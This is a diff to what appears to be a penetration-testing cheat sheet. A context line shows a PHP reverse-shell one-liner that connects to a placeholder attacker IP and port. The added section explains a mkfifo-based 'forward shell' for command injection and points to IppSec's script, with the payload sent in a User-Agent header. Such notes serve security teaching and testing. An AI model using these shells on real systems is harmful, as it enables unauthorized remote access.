@@ -70,3 +70,15 @@ This payload can also work with `BeanShell` scripts.
 php -r '\$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'
 ```
 
+
+## Forward shell
+
+If the remote server cannot contact your local machine, it's still possible to
+use a shell that accept commands from named pipes using `mkfifo` and send the
+output to a file.
+
+IppSec has a repository on Github with a simple but effective script to demonstrate
+the technique on a vulnerable web server: [`forward-shell`](https://github.com/IppSec/forward-shell).
+You need to set the vulnerable url (`self.url = r"http://'...`) and the exploit
+arguments (`headers = {'User-Agent': payload}`). Remember that you can use the same
+technique on other services that allow you to inject commands.
